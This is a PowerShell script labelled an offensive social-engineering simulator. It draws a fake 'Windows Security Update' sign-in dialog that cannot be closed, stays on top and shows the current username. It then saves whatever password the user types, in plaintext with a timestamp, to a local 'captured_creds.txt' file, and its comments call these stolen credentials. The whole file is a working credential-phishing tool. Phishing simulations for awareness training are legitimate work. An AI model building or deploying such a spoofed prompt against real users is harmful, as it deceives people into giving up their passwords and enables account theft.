# =============================================================================
# FILE: Shadow_Login.ps1
# MODULE: [OFFENSE] SOCIAL ENGINEERING SIMULATOR (STABLE)
# ARCHITECT: Navaneethan.P
# =============================================================================

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# --- CONFIGURATION ---
$LogFile = "$PSScriptRoot\..\..\DATA\captured_creds.txt"

# Create the Fake Login Form
$Form = New-Object System.Windows.Forms.Form
$Form.Text = "Windows Security Update"
$Form.Size = New-Object System.Drawing.Size(500,350)
$Form.StartPosition = "CenterScreen"
$Form.FormBorderStyle = "FixedDialog"
$Form.TopMost = $true
$Form.ControlBox = $false # Remove X button
$Form.BackColor = [System.Drawing.Color]::White

# Title Label
$Title = New-Object System.Windows.Forms.Label
$Title.Location = New-Object System.Drawing.Point(50,30)
$Title.Size = New-Object System.Drawing.Size(400,50)
$Title.Text = "Authentication Required"
$Title.Font = New-Object System.Drawing.Font("Segoe UI", 16, [System.Drawing.FontStyle]::Bold)
$Title.ForeColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
$Form.Controls.Add($Title)

# Subtitle
$Sub = New-Object System.Windows.Forms.Label
$Sub.Location = New-Object System.Drawing.Point(50,80)
$Sub.Size = New-Object System.Drawing.Size(400,40)
$Sub.Text = "A critical security update requires administrative verification. Please sign in to continue."
$Sub.Font = New-Object System.Drawing.Font("Segoe UI", 10)
$Form.Controls.Add($Sub)

# User Label
$LblUser = New-Object System.Windows.Forms.Label
$LblUser.Location = New-Object System.Drawing.Point(50,130)
$LblUser.Text = "Username: $env:USERNAME"
$LblUser.AutoSize = $true
$LblUser.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
$Form.Controls.Add($LblUser)

# Password Box
$TxtPass = New-Object System.Windows.Forms.TextBox
$TxtPass.Location = New-Object System.Drawing.Point(50,160)
$TxtPass.Size = New-Object System.Drawing.Size(380,30)
$TxtPass.Font = New-Object System.Drawing.Font("Segoe UI", 12)

# --- FIX: Use simple Asterisk for password masking ---
$TxtPass.PasswordChar = "*" 

$Form.Controls.Add($TxtPass)

# Login Button
$BtnLogin = New-Object System.Windows.Forms.Button
$BtnLogin.Location = New-Object System.Drawing.Point(280,220)
$BtnLogin.Size = New-Object System.Drawing.Size(150,40)
$BtnLogin.Text = "Sign In"
$BtnLogin.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
$BtnLogin.ForeColor = [System.Drawing.Color]::White
$BtnLogin.FlatStyle = "Flat"
$BtnLogin.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
$Form.Controls.Add($BtnLogin)

# Button Logic
$BtnLogin.Add_Click({
    $Password = $TxtPass.Text
    if ($Password.Length -gt 0) {
        # Log the stolen credential
        $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        "$Timestamp | User: $env:USERNAME | Pass: $Password" | Out-File $LogFile -Append
        
        # Close Form
        $Form.Close()
    } else {
        [System.Windows.Forms.MessageBox]::Show("Password cannot be empty.", "Error", "OK", "Error")
    }
})

# Show Form
Write-Host "   [ACTIVATE] Launching Shadow Prompt..." -ForegroundColor Yellow
$Form.ShowDialog() | Out-Null

Write-Host "   [SUCCESS] Credentials captured to: $LogFile" -ForegroundColor Green
Read-Host "   Press Enter to return..."